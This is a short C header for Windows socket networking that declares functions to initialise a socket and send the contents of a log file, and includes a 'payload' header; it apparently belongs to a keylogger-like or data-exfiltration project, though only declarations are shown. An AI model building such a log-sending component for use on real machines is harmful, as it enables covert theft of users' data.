#ifndef NETWORKING_H
#define NETWORKING_H

#include <winsock2.h>
#include <ws2tcpip.h>
#include "constants.h"
#include "util/util.h"
#include "payload/system.h"

#pragma comment(lib, "ws2_32.lib")

extern int init_networking();
extern int send_log_file_contents(SOCKET* sock);
extern int init_socket(SOCKET* socket_out);
extern int close_socket(SOCKET* sock);

#endif
